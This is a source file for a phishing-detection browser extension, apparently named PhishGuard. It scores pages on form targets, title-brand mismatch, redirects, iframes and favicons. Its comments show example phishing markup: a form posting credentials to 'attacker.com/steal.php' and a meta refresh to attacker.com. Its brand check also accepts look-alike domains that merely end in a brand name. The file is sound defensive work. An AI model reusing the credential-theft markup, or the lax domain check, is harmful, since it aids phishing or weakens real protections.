/**
 * content/content-script.js
 *
 * Runs inside every webpage the user visits (isolated world).
 * Analyzes the DOM for phishing indicators and reports to service worker.
 *
 * CRITICAL CONSTRAINTS — read before editing:
 *   - NO ES module imports (content scripts are not modules)
 *   - Only chrome.runtime.* is available (not chrome.tabs, chrome.storage, etc.)
 *   - Runs in an isolated world — page's own JS variables are not accessible
 *   - Must never throw an uncaught exception — wrap everything defensively
 *   - Must never slow down page rendering — all work is post-load
 *   - Must handle any DOM structure — adversarial pages can be anything
 *
 * SIGNALS COLLECTED:
 *   Form analysis:
 *     hasLoginForm           — page has a form that collects credentials
 *     formActionExternal     — that form submits to a different domain
 *     formActionDomain       — which external domain
 *     hasPasswordField       — form includes a password input
 *     passwordWithoutHttps   — password collected over HTTP (no TLS)
 *
 *   Page identity:
 *     titleBrandMismatch     — page title names a known brand, domain doesn't match
 *     titleBrand             — which brand was detected in the title
 *     metaRefreshExternal    — <meta refresh> redirects to external domain
 *     metaRefreshDomain      — which external domain
 *
 *   Resource analysis:
 *     externalResourceRatio  — fraction of resources loaded from other domains
 *                              (CDNs excluded from numerator)
 *     suspiciousIframe       — iframe loads content from a different domain
 *
 *   Favicon:
 *     faviconMismatch        — favicon loads from a different domain
 *     faviconDomain          — which domain the favicon loads from
 */

;(function () {
  'use strict'

  // ─── Guards ────────────────────────────────────────────────────────────────
  if (!location.href.startsWith('http://') && !location.href.startsWith('https://')) return
  if (window.__phishguardInitialized) return
  window.__phishguardInitialized = true

  const pageHostname = location.hostname
  const pageProtocol = location.protocol  // 'https:' or 'http:'

  // ─── Known CDN Domains ────────────────────────────────────────────────────
  // These appear as external resources on countless legitimate sites.
  // Counting them in the external resource ratio creates false positives.
  // We exclude them from the external resource numerator (not denominator).
  const KNOWN_CDNS = new Set([
    'fonts.googleapis.com', 'fonts.gstatic.com',         // Google Fonts
    'cdnjs.cloudflare.com', 'cdn.cloudflare.com',        // Cloudflare CDN
    'ajax.googleapis.com', 'apis.google.com',            // Google APIs
    'cdn.jsdelivr.net', 'unpkg.com',                     // JS package CDNs
    'stackpath.bootstrapcdn.com', 'maxcdn.bootstrapcdn.com', // Bootstrap
    'code.jquery.com',                                   // jQuery CDN
    'use.fontawesome.com', 'kit.fontawesome.com',        // FontAwesome
    'static.cloudflareinsights.com',                     // Cloudflare analytics
    'www.google-analytics.com', 'www.googletagmanager.com', // GA/GTM
    'connect.facebook.net',                              // FB pixel
    'snap.licdn.com',                                    // LinkedIn pixel
    'cdn.segment.com',                                   // Segment
    'js.stripe.com', 'js.braintreegateway.com',         // Payment SDKs
    'checkout.razorpay.com',                             // Razorpay
    'assets.razorpay.com',                               // Razorpay assets
  ])

  // ─── Known Brand → Domain Map ──────────────────────────────────────────────
  // Used for title brand mismatch detection.
  // If a page title contains a brand name but the domain isn't the brand's
  // real domain, this is a strong phishing indicator.
  //
  // Format: { 'brand keyword': ['expected-domain1', 'expected-domain2'] }
  // The page domain must END WITH one of these to be considered legitimate.
  const BRAND_DOMAINS = {
    'paypal':       ['paypal.com', 'paypal.me'],
    'google':       ['google.com', 'google.co.in', 'google.co.uk', 'gmail.com', 'accounts.google.com'],
    'gmail':        ['google.com', 'gmail.com'],
    'apple':        ['apple.com', 'icloud.com'],
    'microsoft':    ['microsoft.com', 'live.com', 'outlook.com', 'office.com', 'microsoftonline.com'],
    'outlook':      ['microsoft.com', 'live.com', 'outlook.com', 'office.com'],
    'office 365':   ['microsoft.com', 'microsoftonline.com', 'office.com'],
    'amazon':       ['amazon.com', 'amazon.in', 'amazon.co.uk', 'aws.amazon.com'],
    'aws':          ['aws.amazon.com', 'amazon.com'],
    'facebook':     ['facebook.com', 'fb.com', 'meta.com'],
    'instagram':    ['instagram.com'],
    'whatsapp':     ['whatsapp.com', 'web.whatsapp.com'],
    'twitter':      ['twitter.com', 'x.com'],
    'netflix':      ['netflix.com'],
    'spotify':      ['spotify.com'],
    'linkedin':     ['linkedin.com'],
    'dropbox':      ['dropbox.com'],
    'github':       ['github.com'],
    'steam':        ['steampowered.com', 'store.steampowered.com', 'steamcommunity.com'],
    'discord':      ['discord.com', 'discordapp.com'],
    'coinbase':     ['coinbase.com'],
    'binance':      ['binance.com'],
    'metamask':     ['metamask.io'],
    // Indian brands
    'sbi':          ['sbi.co.in', 'onlinesbi.sbi'],
    'hdfc':         ['hdfcbank.com', 'netbanking.hdfcbank.com'],
    'icici':        ['icicibank.com'],
    'axis bank':    ['axisbank.com'],
    'paytm':        ['paytm.com'],
    'phonepe':      ['phonepe.com'],
    'upi':          ['upi.org', 'npci.org.in'],
  }

  // ─── Main Analysis Function ───────────────────────────────────────────────
  function analyzePageContent() {
    const analysis = {
      // Form signals
      hasLoginForm:          false,
      formActionExternal:    false,
      formActionDomain:      null,
      hasPasswordField:      false,
      passwordWithoutHttps:  false,

      // Page identity signals
      titleBrandMismatch:    false,
      titleBrand:            null,
      metaRefreshExternal:   false,
      metaRefreshDomain:     null,

      // Resource signals
      externalResourceRatio: 0,
      suspiciousIframe:      false,

      // Favicon signal
      faviconMismatch:       false,
      faviconDomain:         null,

      // Metadata (for debugging and popup display)
      pageHostname,
      pageProtocol,
      analyzedAt: Date.now(),
    }

    try {
      analyzeForms(analysis)
      analyzeTitleBrand(analysis)
      analyzeMetaRefresh(analysis)
      analyzeResources(analysis)
      analyzeIframes(analysis)
      analyzeFavicon(analysis)
    } catch (err) {
      // Errors must NEVER surface to the user or crash the extension
      console.debug('[PhishGuard] Content analysis error:', err.message)
    }

    return analysis
  }

  // ─── Analyzer 1: Form Analysis ───────────────────────────────────────────
  /**
   * Detect credential-collecting forms and their submission targets.
   *
   * KEY INSIGHT about form.action default behaviour:
   * When a form has no `action` attribute (or action=""), the browser
   * sets form.action to the current page URL. This is LEGITIMATE.
   * We only flag when action is EXPLICITLY set to an external domain.
   * Detection: check form.hasAttribute('action') before reading form.action.
   *
   * Phishing pattern we're looking for:
   *   <form action="https://attacker.com/steal.php">
   *     <input type="email" />
   *     <input type="password" />
   *   </form>
   * The credential goes to attacker.com, not the displayed domain.
   */
  function analyzeForms(analysis) {
    const forms = document.querySelectorAll('form')

    forms.forEach(form => {
      const inputs    = form.querySelectorAll('input')
      const inputArr  = [...inputs]
      const types     = inputArr.map(i => (i.type || 'text').toLowerCase())

      const hasPassword = types.includes('password')
      const hasEmail    = types.includes('email')
      const hasText     = types.some(t => ['text', 'tel'].includes(t))

      // A login form: has a password field, OR collects email + text inputs
      const isLoginForm = hasPassword || (hasEmail && inputArr.length >= 2) ||
                          (hasText && inputArr.length >= 3)

      if (!isLoginForm) return

      analysis.hasLoginForm   = true
      analysis.hasPasswordField = analysis.hasPasswordField || hasPassword

      // Flag password collection without HTTPS
      if (hasPassword && pageProtocol !== 'https:') {
        analysis.passwordWithoutHttps = true
      }

      // Check form action — only if action attribute is explicitly set
      // form.hasAttribute('action') returns false when action is absent
      // Avoids false positive where form.action resolves to current page URL
      if (form.hasAttribute('action')) {
        const actionAttr = form.getAttribute('action')

        // Skip clearly relative or in-page actions
        if (!actionAttr || actionAttr === '#' || actionAttr.startsWith('#')) return

        try {
          // Resolve relative action URLs against the current page base
          const resolvedAction  = new URL(actionAttr, location.href)
          const actionHostname  = resolvedAction.hostname

          if (actionHostname && actionHostname !== pageHostname) {
            analysis.formActionExternal = true
            analysis.formActionDomain   = actionHostname
          }
        } catch { /* malformed action URL — skip */ }
      }
    })
  }

  // ─── Analyzer 2: Title Brand Mismatch ────────────────────────────────────
  /**
   * Detects when a page claims to be a known brand in its title
   * but is hosted on a domain that doesn't belong to that brand.
   *
   * This is one of the strongest phishing signals available:
   * Phishing kits clone pages verbatim, including <title> tags.
   * So "Log In | PayPal" appearing at paypa1.com is highly damning.
   *
   * We check the title against our BRAND_DOMAINS map.
   * A mismatch fires only when the domain does NOT end with
   * any of the brand's known legitimate domains.
   */
  function analyzeTitleBrand(analysis) {
    const title = (document.title || '').toLowerCase().trim()
    if (!title) return

    for (const [brand, legitimateDomains] of Object.entries(BRAND_DOMAINS)) {
      if (!title.includes(brand)) continue

      // Check if current domain is legitimate for this brand
      const isLegitimate = legitimateDomains.some(d => {
        return pageHostname === d ||
               pageHostname.endsWith('.' + d) ||
               pageHostname.endsWith(d)
      })

      if (!isLegitimate) {
        analysis.titleBrandMismatch = true
        analysis.titleBrand = brand
        break  // First match is enough
      }
    }
  }

  // ─── Analyzer 3: Meta Refresh Detection ───────────────────────────────────
  /**
   * Detects <meta http-equiv="refresh"> tags that redirect to external URLs.
   *
   * Format: <meta http-equiv="refresh" content="0; url=https://attacker.com">
   *
   * Legitimate uses: same-domain redirects after form submission.
   * Suspicious: immediate redirect to a different domain.
   * This is commonly used in redirect-chain phishing attacks.
   */
  function analyzeMetaRefresh(analysis) {
    const metas = document.querySelectorAll('meta[http-equiv="refresh"]')

    metas.forEach(meta => {
      const content = meta.getAttribute('content') || ''
      // Parse: "5; url=https://..."  or  "0;URL=https://..."
      const urlMatch = content.match(/url\s*=\s*(.+)/i)
      if (!urlMatch) return

      const targetUrl = urlMatch[1].trim().replace(/['"]/g, '')
      try {
        const targetHostname = new URL(targetUrl, location.href).hostname
        if (targetHostname && targetHostname !== pageHostname) {
          analysis.metaRefreshExternal = true
          analysis.metaRefreshDomain   = targetHostname
        }
      } catch { /* malformed URL */ }
    })
  }

  // ─── Analyzer 4: External Resource Ratio ─────────────────────────────────
  /**
   * Calculates the fraction of resources loaded from domains other
   * than the current page's domain.
   *
   * WHY THIS DETECTS CLONED PAGES:
   * Phishing kits clone pages using tools like HTTrack or SingleFile.
   * Images, scripts, and CSS are not re-hosted — they stay at the
   * original domain. So a cloned PayPal page at paypa1.com loads most
   * of its resources from paypal.com — a very high external ratio.
   *
   * Legitimate sites: external ratio typically 20–40% (CDNs, analytics)
   * Cloned phishing pages: external ratio typically 70–95%
   *
   * CDN domains are EXCLUDED from the external count (not the total)
   * to prevent false positives on sites that use many external services.
   */
  function analyzeResources(analysis) {
    const allResources = performance.getEntriesByType('resource')
    if (allResources.length === 0) return

    let externalCount = 0
    for (const entry of allResources) {
      try {
        const resourceHostname = new URL(entry.name).hostname
        if (resourceHostname === pageHostname) continue

        // Exclude known CDN domains from external count
        if (KNOWN_CDNS.has(resourceHostname)) continue

        externalCount++
      } catch { /* skip data: URIs and malformed URLs */ }
    }

    analysis.externalResourceRatio = externalCount / allResources.length
  }

  // ─── Analyzer 5: Iframe Analysis ─────────────────────────────────────────
  /**
   * Detects iframes that load content from external domains.
   *
   * Legitimate use: embedded YouTube videos, payment widgets, maps.
   * Suspicious use: hidden iframes that load phishing forms from other domains,
   * or credential-stealing overlays.
   *
   * We flag iframes that:
   *   - Load from a non-CDN external domain
   *   - Are positioned to cover the full page (classic overlay attack)
   *   - Have explicit width/height set to cover viewport
   */
  function analyzeIframes(analysis) {
    const iframes = document.querySelectorAll('iframe')

    iframes.forEach(iframe => {
      const src = iframe.src || iframe.getAttribute('src')
      if (!src) return

      try {
        const iframeHostname = new URL(src, location.href).hostname
        if (iframeHostname === pageHostname) return
        if (KNOWN_CDNS.has(iframeHostname)) return

        // External iframe — check if it's suspicious
        // Heuristic: full-coverage iframes or hidden iframes are more suspicious
        const style  = window.getComputedStyle(iframe)
        const width  = parseFloat(style.width)  || 0
        const height = parseFloat(style.height) || 0
        const isFullCover = (width > window.innerWidth * 0.8 && height > window.innerHeight * 0.8)
        const isHidden    = (style.display === 'none' || style.visibility === 'hidden' ||
                             style.opacity === '0')

        if (isFullCover || isHidden) {
          analysis.suspiciousIframe = true
        }
      } catch { /* malformed src */ }
    })
  }

  // ─── Analyzer 6: Favicon Domain Mismatch ─────────────────────────────────
  /**
   * Detects when the page favicon loads from a different domain.
   *
   * WHY THIS IS A SIGNAL:
   * Phishing kits often reference the real brand's favicon directly:
   *   <link rel="icon" href="https://paypal.com/favicon.ico">
   * This makes the browser tab look like the real site.
   * But the favicon loads from a domain that doesn't match the page.
   *
   * Note: CDN-hosted favicons on legitimate sites are common (we allow them).
   * We flag only non-CDN external favicon domains.
   */
  function analyzeFavicon(analysis) {
    const selectors = [
      'link[rel="icon"]',
      'link[rel="shortcut icon"]',
      'link[rel="apple-touch-icon"]',
      'link[rel="apple-touch-icon-precomposed"]',
    ]

    for (const selector of selectors) {
      const link = document.querySelector(selector)
      if (!link?.href) continue

      try {
        const favHostname = new URL(link.href).hostname
        if (!favHostname || favHostname === pageHostname) break
        if (KNOWN_CDNS.has(favHostname)) break

        analysis.faviconMismatch = true
        analysis.faviconDomain   = favHostname
      } catch { /* skip */ }

      break  // Only check first favicon
    }
  }

  // ─── Send to Service Worker ───────────────────────────────────────────────
  function reportAnalysis() {
    const payload = analyzePageContent()

    chrome.runtime.sendMessage({ type: 'CONTENT_ANALYSIS', payload }, response => {
      // Suppress expected error on first load (service worker may not be ready)
      if (chrome.runtime.lastError) {
        console.debug('[PhishGuard] SW not ready (ok on first load):',
          chrome.runtime.lastError.message)
      }
    })
  }

  // ─── SPA Navigation Detection ─────────────────────────────────────────────
  // SPAs change the URL via history.pushState without triggering navigation events.
  // MutationObserver on body catches the DOM changes that accompany route changes.
  let lastUrl  = location.href
  let spaTimer = null

  const spaObserver = new MutationObserver(() => {
    if (location.href === lastUrl) return
    lastUrl = location.href

    // Debounce: wait for SPA to finish rendering before analyzing
    clearTimeout(spaTimer)
    spaTimer = setTimeout(() => {
      reportAnalysis()
    }, 600)
  })

  if (document.body) {
    spaObserver.observe(document.body, { subtree: true, childList: true })
  }

  // ─── Initial Analysis ──────────────────────────────────────────────────────
  reportAnalysis()

})()
